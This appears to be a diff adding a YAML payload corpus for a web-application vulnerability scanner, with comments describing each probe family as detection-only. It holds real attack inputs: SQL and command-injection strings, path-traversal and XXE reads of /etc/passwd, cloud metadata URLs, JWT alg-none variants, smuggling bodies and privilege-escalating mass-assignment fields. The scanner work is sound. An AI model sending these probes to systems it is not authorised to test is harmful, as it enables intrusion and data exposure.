@@ -1,0 +1,517 @@
+# M3 web-application probe corpus (S6, docs/spec/05- M3, F-09-04).
+#
+# Everything an M3 oracle sends is *data* here, so an operator can narrow or extend it
+# without touching code (F-09-04) and so a reviewer can read exactly what leaves the scanner
+# in one place. Two rules govern every entry, and they are the M3 safety contract
+# (docs/spec/05- "M3 · Safety", docs/spec/07- §8):
+#
+#   1. **Detection-only.** A payload is a probe, not an exploit: single-character deltas, a
+#      benign reflection marker, an encoding variant. Nothing here stores hostile content,
+#      executes code, reads a credential file, or modifies data.
+#   2. **Differential.** Every family's confirmation is a *measured difference* against a
+#      baseline the check establishes first (error text, body/status delta, timing delta,
+#      ``Location`` host), never the mere presence of the payload string.
+#
+# ``params`` holds parameter-name hints: a family is only tried where its name hint appears,
+# which keeps a probe count proportional to the surface (and keeps a timestamp parameter from
+# being handed a traversal payload).
+
+version: "1.0"
+
+# --------------------------------------------------------------------------- parameter hints
+# Which parameter names a family is tried against. A family is only attempted where its hint
+# appears, which keeps the probe count proportional to the surface: a `timestamp` parameter is
+# never handed a traversal payload, and an object-id oracle does not enumerate a search box.
+params:
+  object_ids: ["id", "user", "userid", "user_id", "uid", "account", "account_no", "account_id", "order", "order_id", "orderid", "invoice", "invoice_id", "doc", "doc_id", "docid", "record", "record_id", "item", "item_id", "itemid", "pid", "post", "post_id", "postid", "num", "no", "n"]
+  redirect: ["url", "next", "redirect", "redirect_uri", "redirect_url", "return", "return_url", "returnurl", "return_to", "returnto", "continue", "dest", "destination", "goto", "target", "to", "out", "link", "callback", "back", "forward", "ref", "referer", "u", "uri"]
+  file: ["file", "filename", "path", "page", "template", "download", "document", "doc", "include", "load", "src", "view", "dir", "folder", "img", "image", "read", "name"]
+
+# --------------------------------------------------------------------------- SQL injection (ch03#1)
+sqli:
+  # Values sent as the "benign" baseline so the oracle compares like with like.
+  benign_values: ["1", "test"]
+  # Single-character deltas: a quote/backslash that must not change a non-injectable response.
+  error_payloads: ["'", "\"", "')", "';", "\\"]
+  boolean:
+    # The classic 1=1 / 1=2 pair. Both are inert: they only make the back-end predicate true
+    # or false, which the oracle reads as a body/status delta.
+    - {name: quote-true, payload: "1' AND '1'='1", truth: true}
+    - {name: quote-false, payload: "1' AND '1'='2", truth: false}
+    - {name: numeric-true, payload: "1 AND 1=1", truth: true}
+    - {name: numeric-false, payload: "1 AND 1=2", truth: false}
+  # A blocking-sleep probe, used only when the error/boolean oracles did not confirm the
+  # parameter. ``{delay}`` is filled from ARACHNE_WEB_TIME_DELAY_S; the loop is bounded by
+  # ``time_delta_s`` above the baseline, and exactly one time payload per parameter is sent.
+  time:
+    - {family: mysql, payload: "1' AND SLEEP({delay})-- -"}
+    - {family: postgresql, payload: "1'; SELECT pg_sleep({delay})-- -"}
+  # Error text that proves the back-end parsed the input as SQL. Matched case-insensitively
+  # against the probe response body; a hit is the error-based oracle's positive.
+  error_signatures:
+    mysql: "SQL syntax.*MySQL|Warning.*mysqli?_|MySqlException|check the manual that .{0,20}(corresponds|matches)"
+    postgresql: "PostgreSQL.{0,40}ERROR|WARNING:.{0,20}PostgreSQL|pg_query\\(\\)|unterminated quoted string|syntax error at or near"
+    mssql: "Microsoft OLE DB Provider for SQL Server|Unclosed quotation mark|System\\.Data\\.SqlClient|Incorrect syntax near"
+    oracle: "ORA-\\d{4,5}|Oracle error|quoted string not properly terminated"
+    sqlite: "SQLite/JDBCDriver|SQLite\\.Exception|System\\.Data\\.SQLite|sqlite3\\.(OperationalError|ProgrammingError)|unrecognized token"
+    generic: "SQLException|SQLSTATE\\[|You have an error in your SQL syntax"
+
+# --------------------------------------------------------------------------- XSS (ch03#3)
+xss:
+  # An inert probe: an unknown (non-executable, non-rendering) element plus quote breakers.
+  # ``{nonce}`` makes each probe unique so a cached or reflected *previous* response cannot
+  # confirm the wrong request. Detection is "the raw probe came back unencoded", classified by
+  # the context it landed in; nothing here can execute in any browser.
+  probe_template: "<a{nonce}>\"'{nonce}"
+  # Raw fragments whose presence in the response proves the angle bracket (``html``) or the
+  # quote characters (``attribute``) were not encoded. Derived from the probe above; listed
+  # here so a reviewer sees exactly what the classifier looks for.
+  html_marker: "<a{nonce}>"
+  attribute_marker: "'{nonce}"
+
+# --------------------------------------------------------------------------- path traversal (ch03#11)
+traversal:
+  # Encoding classes, per research ch03#11: plain, URL-encoded, double-encoded, overlong/odd
+  # separators, backslash. Each is tried against a file-name parameter only.
+  posix:
+    - "../../../../../../etc/passwd"
+    - "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+    - "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+    - "..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
+    - "....//....//....//....//....//....//etc/passwd"
+    - "/etc/passwd"
+  windows:
+    - "..\\..\\..\\..\\..\\..\\windows\\win.ini"
+    - "..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini"
+  # Content markers that prove a *world-readable, non-secret* file was read. The marker set is
+  # deliberately tiny and non-secret (no /etc/shadow, no key files): a traversal is confirmed
+  # by reading a harmless system file, never by exfiltrating anything sensitive.
+  markers:
+    - {name: etc-passwd, regex: "root:[x*]?:0:0:", file: "/etc/passwd"}
+    - {name: windows-winini, regex: "\\[(fonts|extensions|mci extensions)\\]", file: "windows/win.ini"}
+  # Parameter hints are shared with the other families: see the ``params`` section above.
+  file_params: ["file", "filename", "path", "page", "template", "download", "document", "doc", "include", "load", "src", "view", "dir", "folder", "img", "image", "read", "name"]
+
+# --------------------------------------------------------------------------- upload (ch03#10)
+upload:
+  # The marker file body: plain text, explicitly non-executable, so an accepted upload cannot
+  # be a webshell. The check reads it back to confirm storage (never executes it).
+  marker_body: "ARACHNE upload-validation probe. Plain text, no executable content.\n"
+  marker_filename: "arachne-probe"
+  # Extension classes the validation matrix tries, one request each. Kept to the "is an
+  # active/executable extension accepted without a content-type or magic-byte check" question
+  # (research ch03#10) — no ``.htaccess``/``web.config`` overrides, because those change
+  # server configuration rather than prove a validation gap.
+  extensions:
+    - {ext: "php", content_type: "application/x-php"}
+    - {ext: "php5", content_type: "image/gif"}
+    - {ext: "phtml", content_type: "text/plain"}
+    - {ext: "jsp", content_type: "application/octet-stream"}
+    - {ext: "aspx", content_type: "text/plain"}
+  # Response markers that mean "the upload logic took the file" or "it refused it".
+  accepted_markers: ["uploaded", "success", "saved", "stored", "created"]
+  rejected_markers: ["not allowed", "invalid", "forbidden", "rejected", "only ", "denied", "unsupported"]
+
+# --------------------------------------------------------------------------- auth & session (ch03#19)
+auth:
+  # Plausible privileged names the enumeration differential compares against a random one.
+  # This is *existence* probing with a single dummy password, lockout-safe and bounded — the
+  # same posture M2 takes for Kerberos user enumeration (research ch02#19), never a
+  # credential attack (F-01-09, docs/spec/05- "Safety").
+  usernames: ["admin", "administrator", "root", "test", "user"]
+  dummy_password: "arachne-not-a-credential"
+  # Field-name hints, so a login form is recognised structurally rather than by page title.
+  user_fields: ["username", "user", "email", "login", "uname", "userid", "user_id", "name"]
+  password_fields: ["password", "passwd", "pwd", "pass", "secret"]
+
+# --------------------------------------------------------------------------- CSRF (ch03#4)
+csrf:
+  # Field names that indicate a per-session anti-CSRF token (any match clears the form).
+  token_fields: ["csrf", "csrf_token", "csrftoken", "csrfmiddlewaretoken", "_csrf", "authenticity_token", "_token", "token", "xsrf", "xsrf_token", "__requestverificationtoken", "form_token", "anticsrf", "nonce"]
+  # Path fragments that mark a state-changing action, so a GET-reachable mutation stands out.
+  state_change_fragments: ["delete", "remove", "update", "edit", "create", "save", "logout", "signout", "password", "transfer", "settings", "admin", "upload", "register", "subscribe", "cancel", "confirm"]
+
+# --------------------------------------------------------------------------- CORS (ch03#23)
+cors:
+  # Probe origins: an RFC 2606 ``.invalid`` name (never resolvable, never contacted) and the
+  # literal ``null`` origin (the sandboxed-iframe / data: vector).
+  origins: ["https://arachne-cors.invalid", "null"]
+
+# --------------------------------------------------------------------------- open redirect (ch03#14)
+redirect:
+  # A reserved non-resolving host, so if a redirect is followed anyway it cannot reach anyone.
+  probe_host: "arachne-redirect.invalid"
+  # URL classes from research ch03#14: absolute, scheme-relative, backslash-confusion,
+  # userinfo confusion, encoded, and a bare host.
+  payloads:
+    - "https://{host}/"
+    - "//{host}/"
+    - "/\\{host}/"
+    - "https://example.com@{host}/"
+    - "%2f%2f{host}%2f"
+    - "https://{host}"
+
+# --------------------------------------------------------------------------- security headers (ch03#24)
+headers:
+  # Expected hardening, per scheme. HSTS is only meaningful over HTTPS (research ch03#24).
+  http: ["content-security-policy", "x-content-type-options", "x-frame-options", "referrer-policy"]
+  https: ["strict-transport-security", "content-security-policy", "x-content-type-options", "x-frame-options", "referrer-policy"]
+  # Cookies that look like session cookies (the ones whose flags matter most).
+  session_cookie_names: ["phpsessid", "jsessionid", "asp.net_sessionid", "session", "sessionid", "connect.sid", "sid", "auth", "token", "laravel_session", "ci_session", "rack.session"]
+
+# --------------------------------------------------------------------------- API surface (ch03#31)
+api:
+  # Paths a hidden endpooint hunt probes (research ch03#31: crawl + spec parse + wordlist).
+  # Also shipped as ``wordlists/hidden-paths.txt`` for operators who want to extend it.
+  wordlist: "wordlists/hidden-paths.txt"
+  # Documents that describe the API when present (parsed for the endpoint inventory).
+  spec_paths: ["/swagger.json", "/openapi.json", "/v2/api-docs", "/api-docs", "/swagger/v1/swagger.json", "/openapi.yaml"]
+  # Verbs probed on a discovered endpoint for the OPTIONS/Allow advertisement.
+  verbs: ["OPTIONS"]
+  # Response markers that indicate the endpoint is a real handler rather than the app's
+  # not-found page (a "hidden endpoint found" positive needs more than a non-404 status).
+  interest_statuses: [200, 201, 204, 301, 302, 303, 307, 308, 401, 403, 405]
+
+# --------------------------------------------------------------------------- rate limiting (ch03#35)
+rate_limit:
+  # Paths whose anti-automation posture matters most (research ch03#35).
+  paths: ["/login", "/signin", "/api/login", "/api/auth/login", "/api/session", "/forgot-password", "/register", "/api/v1/login"]
+  # Status codes / markers that indicate throttling or anti-bot controls engaged.
+  throttle_statuses: [429, 503]
+  throttle_markers: ["too many requests", "rate limit", "slow down", "try again later", "captcha", "recaptcha", "hcaptcha", "locked", "temporarily blocked"]
+  # A header the limiter might key on; the check rotates it to test whether the control is
+  # bypassable by a client-supplied value (research ch03#35).
+  spoof_headers: ["X-Forwarded-For", "X-Real-IP", "Client-IP", "True-Client-IP"]
+
+# =====================================================================================
+# S10 · extended families. Same two rules as above: detection-only, differential. Every
+# section is optional (the S6 core sections are the only ones ``parse_payloads`` requires),
+# so a deployment may ship a corpus that narrows these families without breaking the core.
+# =====================================================================================
+
+# --------------------------------------------------------------------------- SSRF (ch03#5)
+ssrf:
+  # Parameter names that indicate a server-side fetch (a webhook, an avatar URL, a proxy).
+  sink_param_hints: ["url", "uri", "link", "src", "source", "target", "dest", "destination", "redirect", "redirect_uri", "next", "callback", "webhook", "feed", "image", "img", "avatar", "fetch", "load", "host", "domain", "proxy", "path", "file", "return", "returnurl", "return_url", "continue", "site", "reference", "ref", "u", "q"]
+  # The callback path template, resolved against ARACHNE_WEB_SSRF_CALLBACK (ARACHNE's own
+  # infrastructure). ``{nonce}`` makes each probe unique; the callback service answers the
+  # nonce back so an in-band reflection can confirm the fetch as well as an OOB hit.
+  callback_template: "{base}/{nonce}"
+  # Non-routable / link-local classes a fetch sink should refuse. Probed only with the
+  # metadata switch on (they are the SSRF-to-cloud case, research ch05#4).
+  metadata_targets:
+    - {provider: aws, url: "http://169.254.169.254/latest/meta-data/", marker: "ami-id"}
+    - {provider: gcp, url: "http://metadata.google.internal/computeMetadata/v1/", marker: "Metadata-Flavor", header_name: "Metadata-Flavor", header_value: "Google"}
+    - {provider: azure, url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", marker: "azEnvironment", header_name: "Metadata", header_value: "true"}
+
+# --------------------------------------------------------------------------- SSTI (ch03#6)
+ssti:
+  # An arithmetic probe that only *parses* if the value is evaluated as a template. The
+  # expected result is the evaluated form; the raw form must not appear. Inert: arithmetic
+  # only, no built-ins, no file access (research ch03#6: "scanners should not attempt code
+  # execution").
+  arithmetic:
+    - {name: jinja2, probe: "{{7*7}}", expected: "49"}
+    - {name: twig, probe: "{{7*'7'}}", expected: "7777777"}
+    - {name: freemarker, probe: "${7*7}", expected: "49"}
+    - {name: velocity, probe: "#set($x=7*7)$x", expected: "49"}
+    - {name: erb, probe: "<%= 7*7 %>", expected: "49"}
+  # Engine fingerprints in a response body or error page (a parse error names the engine).
+  error_signatures:
+    jinja2: "jinja2\\.exceptions|UndefinedError|TemplateSyntaxError|django\\.template"
+    twig: "Twig\\\\Error|Twig_Error|twig\\.exception"
+    freemarker: "freemarker\\.core|FreeMarker template error"
+    velocity: "org\\.apache\\.velocity|VelocityException"
+    smarty: "SmartyCompilerException|Smarty error"
+    handlebars: "Handlebars\\.Exception|handlebars.*Error"
+
+# --------------------------------------------------------------------------- XXE (ch03#7)
+xxe:
+  # Minimal external-entity documents. The entity points at a *world-readable, non-secret*
+  # file or at the OOB callback; nothing here exfiltrates a credential (research ch03#7).
+  documents:
+    - name: file-read
+      body: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY a SYSTEM \"file:///etc/passwd\">]><r>&a;</r>"
+    - name: file-read-param
+      body: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % p SYSTEM \"file:///etc/passwd\">%p;]><r/>"
+    - name: oob
+      body: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY a SYSTEM \"{callback}\">]><r>&a;</r>"
+  # Content types an XML body is submitted with.
+  content_types: ["application/xml", "text/xml", "application/soap+xml"]
+  # Markers that prove a local file was resolved (world-readable, non-secret).
+  markers:
+    - {name: etc-passwd, regex: "root:[x*]?:0:0:"}
+    - {name: windows-winini, regex: "\\[(fonts|extensions)\\]"}
+  # Parameter-name hints for XML-accepting endpoints.
+  param_hints: ["xml", "xxe", "data", "body", "payload", "document", "content", "soap", "request"]
+
+# --------------------------------------------------------------------------- command injection (ch03#8)
+cmdi:
+  # Separators + a harmless sentinel command. The sentinel echoes a unique nonce; a response
+  # carrying it proves shell parsing (research ch03#8). Timing uses the delay knob.
+  separators: [";", "|", "&&", "||", "`", "$("]
+  sentinel_template: "echo {nonce}"
+  sentinel_suffixes: ["", " #", " >/dev/null"]
+  # A blocking-sleep command used only when echo and timing-free oracles did not confirm.
+  time_template: "sleep {delay}"
+  time_separators: [";", "|", "&&"]
+  # Parameter-name hints (a lookup, a ping, a convert).
+  param_hints: ["cmd", "command", "exec", "ping", "host", "ip", "target", "hostname", "query", "domain", "url", "run", "convert", "process", "name", "arg", "option", "do", "action"]
+
+# --------------------------------------------------------------------------- deserialization (ch03#9)
+deser:
+  # Format fingerprints, by where they appear (a cookie, a body field, a parameter). Each is
+  # a *signature* the check recognises; the probes are structurally-valid-but-benign streams
+  # whose only effect is an observable parser reaction (research ch03#9).
+  signatures:
+    java: "^rO0AB"
+    php: "^(a:\\d+:|O:\\d+:\"|s:\\d+:\")"
+    dotnet: "^AAEAAAD"
+    pickle: "^g?ASV|^\\(lp|^\\(dp"
+  # Base64 markers that indicate a serialized stream once decoded.
+  decoded_markers:
+    java: ["\\xac\\xed\\x00\\x05"]
+  # Benign probes: a structurally valid stream of the family that must round-trip but whose
+  # reconstruction is observable as a parser reaction, never a gadget chain.
+  benign:
+    java: "rO0ABXQAA2FiYw=="
+    php: "a:1:{s:3:\"abc\";s:3:\"abc\";}"
+  # Cookies/params whose names hint at a serialized object.
+  param_hints: ["data", "state", "object", "obj", "session", "sess", "payload", "viewstate", "jsf", "token", "auth", "user", "prefs", "config", "cache", "blob", "serialized"]
+
+# --------------------------------------------------------------------------- request smuggling (ch03#16)
+smuggling:
+  # Framing-conflict probe classes. Each is a *boundary* probe: the smuggled tail is a benign
+  # request line whose timing/status reveals a desync. Nothing hostile is smuggled.
+  probes:
+    - name: cl-te
+      transfer_encoding: "chunked"
+      content_length: 6
+      body: "0\r\n\r\nX"
+    - name: te-cl
+      transfer_encoding: "chunked"
+      content_length: 4
+      body: "5c\r\nGPOST / HTTP/1.1\r\n\r\n0\r\n\r\n"
+    - name: te-obfuscated
+      transfer_encoding: "xchunked"
+      content_length: 6
+      body: "0\r\n\r\nX"
+  # Transfer-Encoding spellings a front-end might accept while a back-end does not.
+  te_obfuscations: ["chunked", "xchunked", "chunked, identity", "identity, chunked", "chunked\t"]
+  # Paths whose desync symptoms are most telling.
+  paths: ["/smuggle", "/smuggle-safe", "/", "/api"]
+
+# --------------------------------------------------------------------------- cache poisoning (ch03#17)
+cache:
+  # Headers a cache might treat as unkeyed (their value lands in the response without being
+  # part of the cache key). Probed with a unique marker host, never a real domain.
+  unkeyed_headers: ["X-Forwarded-Host", "X-Host", "X-Forwarded-Server", "X-Original-URL", "X-Rewrite-URL", "X-Forwarded-Scheme", "X-Forwarded-Port", "X-HTTP-Method-Override", "X-Forwarded-Prefix"]
+  # The marker host reflected into the response when a header is unkeyed.
+  marker_host: "arachne-cache.invalid"
+  # Path-normalization suffixes used for cache deception (a private page cached under a
+  # static-looking key). Detection is the *cached* response differing across the pair.
+  deception_suffixes: [".css", ".js", ".json", ".jpg", "/", ";.css", "%2f"]
+  # Parameters used to bust the cache between probes.
+  bust_param: "arachne_cb"
+
+# --------------------------------------------------------------------------- JWT (ch03#20)
+jwt:
+  # Verify-only probes: an unsigned token, an alg-swapped token, a claim-flipped token. The
+  # check re-signs nothing it cannot (no key material needed) and reads the *acceptance*
+  # differential, never forging a real identity (research ch03#20).
+  alg_variants: ["none", "None", "NONE", "nOnE"]
+  claim_fields: ["exp", "nbf", "iat", "sub", "role", "admin", "is_admin", "scope", "aud", "iss"]
+  # A small offline weak-secret list for the HMAC case (never a live brute-force).
+  weak_secrets: ["secret", "password", "123456", "changeme", "jwt", "test", "key", "your-256-bit-secret", "supersecret", "admin"]
+  # Header-injection fields.
+  header_fields: ["kid", "jku", "jwk", "x5u", "typ", "cty"]
+  # Cookie/header names that carry a token.
+  token_sources: ["authorization", "x-auth-token", "x-access-token", "jwt", "token", "access_token", "id_token"]
+
+# --------------------------------------------------------------------------- OAuth (ch03#21)
+oauth:
+  # authorize-endpoint path hints.
+  authorize_paths: ["/oauth/authorize", "/authorize", "/oauth2/authorize", "/auth/authorize", "/connect/authorize", "/login/oauth/authorize", "/oauth/v2/authorize"]
+  # redirect_uri mutation classes (research ch03#21).
+  redirect_mutations: ["{base}/evil", "https://{host}/{base_path}", "//{host}/evil.invalid", "https://evil.invalid@{host}", "https://{host}@evil.invalid", "{base}%2fevil"]
+  # Parameters whose presence/validation the check reads.
+  parameters: ["redirect_uri", "response_type", "client_id", "state", "scope", "code_challenge", "code_challenge_method", "nonce"]
+
+# --------------------------------------------------------------------------- SAML (ch03#22)
+saml:
+  # Signature-handling probe classes (research ch03#22). Inert: a modified NameID with an
+  # empty/stripped signature, never a real forged assertion.
+  probes:
+    - name: signature-stripped
+      description: "Assertion with the Signature element removed"
+    - name: signature-emptied
+      description: "Assertion whose Signature value is blank"
+    - name: nameid-tampered
+      description: "Assertion whose NameID is altered after signing"
+  # Deterministic endpoint / body hints.
+  endpoint_hints: ["/saml", "/saml/acs", "/SAML2/ACS/POST", "/sso", "/adfs/ls"]
+  parameter_hints: ["SAMLResponse", "SAMLRequest", "RelayState"]
+
+# --------------------------------------------------------------------------- HPP (ch03#25)
+hpp:
+  # Security-relevant parameters whose duplicate-value resolution is worth reading.
+  param_hints: ["role", "admin", "user", "username", "id", "account", "amount", "price", "qty", "quantity", "page", "filter", "action", "status", "type", "redirect", "url", "next", "token", "access"]
+  # The pair of values injected (``first`` then ``second``); a resolution oracle reads which
+  # one the backend honoured.
+  probe_values: ["1", "2"]
+
+# --------------------------------------------------------------------------- mass assignment (ch03#26)
+mass_assign:
+  # Sensitive object properties an over-posting framework might auto-bind.
+  fields:
+    - {name: "role", value: "admin"}
+    - {name: "is_admin", value: "true"}
+    - {name: "isAdmin", value: "true"}
+    - {name: "admin", value: "true"}
+    - {name: "verified", value: "true"}
+    - {name: "balance", value: "999999"}
+    - {name: "credits", value: "999999"}
+    - {name: "email_verified", value: "true"}
+    - {name: "account_type", value: "premium"}
+    - {name: "approved", value: "true"}
+  # Path fragments whose POST/PUT bodies bind to a model.
+  path_hints: ["/register", "/signup", "/users", "/profile", "/settings", "/account", "/api/user", "/api/v1/user", "/me"]
+
+# --------------------------------------------------------------------------- prototype pollution (ch03#27)
+proto_pollution:
+  # Server-observable prototype keys (a JSON merge on the backend) and the marker they carry.
+  # Confirmed by the *server echoing the inherited key* — no headless browser is spawned
+  # (ADR-S10-6: DOM-sink verification stays out of scope).
+  keys: ["__proto__", "constructor.prototype", "prototype"]
+  marker_key: "arachne_polluted"
+  marker_value: "ar9x"
+  # Parameter names whose value is a JSON object the server may merge.
+  param_hints: ["data", "config", "options", "settings", "params", "filters", "query", "json", "payload", "prefs", "metadata", "merge", "preferences", "attributes"]
+
+# --------------------------------------------------------------------------- race (ch03#29)
+race:
+  # Path/action hints for single-use or limited operations.
+  path_hints: ["/redeem", "/coupon", "/gift", "/claim", "/vote", "/transfer", "/withdraw", "/apply", "/verify", "/api/transfer", "/api/redeem"]
+  # The operation whose concurrency the check exercises, and the marker of a double-apply.
+  success_markers: ["success", "redeemed", "claimed", "applied", "accepted", "confirmed", "ok"]
+  conflict_markers: ["already", "used", "duplicate", "conflict", "expired", "consumed", "limit"]
+
+# --------------------------------------------------------------------------- business logic (ch03#30)
+business_logic:
+  # Client-authoritative fields and the edge values that reveal a missing server-side check.
+  quantity_fields: ["qty", "quantity", "count", "amount", "num", "number"]
+  price_fields: ["price", "total", "amount", "cost", "subtotal", "discount"]
+  edge_values: ["-1", "0", "999999999"]
+  # Step/state parameter hints for a workflow skip.
+  step_fields: ["step", "stage", "state", "status", "phase", "next", "confirmed", "paid", "verified"]
+
+# --------------------------------------------------------------------------- GraphQL (ch03#32)
+graphql:
+  endpoint_hints: ["/graphql", "/api/graphql", "/gql", "/v1/graphql", "/api/v1/graphql", "/query", "/graphql/v1"]
+  # The spec introspection query (read-only schema disclosure).
+  introspection_query: "query IntrospectionQuery { __schema { types { name kind fields { name } } } }"
+  # A wrong-field query whose error reveals field suggestions.
+  suggestion_query: "query { __schema { arachneNonexistentField } }"
+  suggestion_markers: ["Did you mean", "Cannot query field", "Unknown field", "suggestions"]
+  # Batching/alias amplification probe (a bounded number of aliases in one request).
+  alias_template: "a{i}: __typename"
+  # --- S29 depth expansion (REQ-DEPTH-001) -----------------------------------------------
+  # Every depth/authorisation probe below selects ONLY the introspection meta-field
+  # ``__typename``: that proves a resolver ran and returned an object without asking the
+  # server for a single document field, so the check never extracts target data.
+  #
+  # Field names whose *presence in the schema* suggests an authenticated resource. The
+  # check queries each one anonymously with a ``__typename``-only selection; data coming
+  # back is the auth-bypass signal, an error is the control.
+  sensitive_field_hints: ["user", "users", "account", "accounts", "admin", "adminusers", "customer", "customers", "order", "orders", "invoice", "invoices", "payment", "payments", "profile", "member", "members", "secret", "secrets", "token", "tokens", "config", "settings", "role", "roles", "permission", "audit"]
+  # The nested-selection template for the depth probe: ``{depth}`` levels of a wrapping
+  # field around a ``__typename`` leaf. Bounded by ``max_depth`` below.
+  depth_template: "{prefix}{{ __typename }}"
+  # The bounded nesting the depth probe is allowed to build: it stays far below any value
+  # that could be called resource exhaustion on a real server.
+  max_depth: 12
+  # Cost probe: this many aliases of ``__typename`` in one operation. Below the
+  # ``alias_abuse_threshold`` the server is enforcing a cost limit; at or above it the
+  # response shape (data, not an error) says no cost limit is applied.
+  alias_probe_size: 32
+  alias_abuse_threshold: 24
+  # Error shapes that mean "the server refused the query" rather than "here is data".
+  refusal_markers: ["MAX_DEPTH", "exceeds maximum", "query too complex", "too many aliases", "cost limit", "complexity", "not authorized", "unauthenticated", "forbidden", "permission denied", "must be authenticated", "login required", "access denied"]
+
+# --------------------------------------------------------------------------- WebSocket (ch03#33)
+websocket:
+  # Endpoint path hints.
+  path_hints: ["/ws", "/websocket", "/socket", "/socket.io/", "/sockjs", "/live", "/realtime", "/api/ws", "/ws/"]
+  # The handshake is a plain GET with the upgrade headers; the check reads the acceptance and
+  # whether Origin is validated (a cross-origin open is the CSWSH primitive, research ch03#33).
+  origins: ["https://arachne-ws.invalid", "null"]
+  upgrade_headers: {Connection: "Upgrade", Upgrade: "websocket", "Sec-WebSocket-Version": "13", "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ=="}
+  # --- S29 depth expansion (REQ-DEPTH-002) -----------------------------------------------
+  # The single application message the injection probe sends: an inert marker with no
+  # command, no query language and no target-specific syntax. It is echoed back verbatim
+  # if the endpoint relays client input, which is the *precondition* of message injection
+  # (research ch03#33) — the probe proves relay, never injects a payload.
+  message_template: "ARACHNE_POC_{nonce} safe-proof-of-websocket-message-relay"
+  # Auth material a WebSocket upgrade normally carries. An upgrade that succeeds with
+  # *none* of these is an endpoint that does not authenticate the connection at all.
+  auth_header_names: ["Authorization", "Cookie", "Sec-WebSocket-Protocol", "X-Auth-Token", "X-API-Key"]
+  # Close codes the server may use to refuse an unauthenticated connection cleanly.
+  auth_refusal_hints: ["401", "403", "unauthorized", "forbidden", "authentication required"]
+
+# --------------------------------------------------------------------------- subdomain takeover (ch03#34)
+takeover:
+  # A can-i-take-over-xyz-shaped fingerprint subset: a service whose unclaimed-name error page
+  # is distinctive. The check resolves a name's CNAME and matches the *service* fingerprint;
+  # it never claims a live alias (research ch03#34).
+  fingerprints:
+    - {service: "GitHub Pages", cname: "github.io", markers: ["There isn't a GitHub Pages site here", "For root URLs (like http://example.com/)"]}
+    - {service: "Heroku", cname: "herokuapp.com", markers: ["No such app", "heroku | no such app"]}
+    - {service: "Amazon S3", cname: "s3.amazonaws.com", markers: ["NoSuchBucket", "The specified bucket does not exist"]}
+    - {service: "Shopify", cname: "myshopify.com", markers: ["Sorry, this shop is currently unavailable"]}
+    - {service: "Fastly", cname: "fastly.net", markers: ["Fastly error: unknown domain"]}
+    - {service: "Azure", cname: "azurewebsites.net", markers: ["Error 404 - Web app not found"]}
+    - {service: "Bitbucket", cname: "bitbucket.io", markers: ["Repository not found"]}
+    - {service: "Netlify", cname: "netlify.app", markers: ["Not Found - Request ID"]}
+    - {service: "Surge.sh", cname: "surge.sh", markers: ["project not found"]}
+    - {service: "Pantheon", cname: "pantheonsite.io", markers: ["The gods are wise, but do not know of the site"]}
+  # The DNS provider the check asks for the CNAME chain (an OSINT-style lookup, opt-in).
+  dns_provider: "dns"
+  max_candidates: 40
+
+# =====================================================================================
+# S15 · proof ladder (area PROOF). Payload material for the L2 out-of-band variants and
+# the attested L3/L4 proofs. Same corpus rules as above: managed data, versioned with the
+# repository, and every template carries only the check's own callback token — never an
+# attacker-controlled URL (REQ-PROOF-005).
+# =====================================================================================
+
+# ------------------------------------------------- blind SQLi, out-of-band (ch03#1)
+sqli_oob:
+  # The predicate is inert arithmetic (no sleep, no read); ``{callback}`` is the check's
+  # own single-use callback token. A back-end that resolves the predicate and reaches the
+  # token proves the sink without any blocking probe.
+  probe_template: "' OR 1=1-- {callback}"
+
+# ------------------------------------------------- XXE, out-of-band (ch03#7)
+xxe_oob:
+  # One external entity whose SYSTEM target is the callback token. The entity never
+  # points at a file or a credential; the hit is the whole proof.
+  document_template: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "{callback}">]><r>&xxe;</r>'
+
+# ------------------------------------------------- blind command injection (ch03#8)
+cmdi_oob:
+  # The payload is the ladder's single allowlisted command (echo arachne-<nonce>,
+  # core.proof.command_payload); the separator wrapping comes from the cmdi section. An
+  # execution monitor reports the echo to the check's callback token.
+
+# ------------------------------------------------- SSTI, out-of-band (ch03#6)
+ssti_oob:
+  # Arithmetic-only template (inert) plus the token reference — the SSTI→SSRF primitive
+  # without any built-in or attribute-chain payload.
+  probe_template: "{{7*7}}[{callback}]"
+
+# ------------------------------------------------- L4 state-marker proof (REQ-PROOF-008)
+state:
+  # The deployment's SQL proof sink: a POST endpoint that executes one statement with
+  # JSON parameters on the target's own database (the lab fixture ships /poc-sql).
+  sink_path: "/poc-sql"
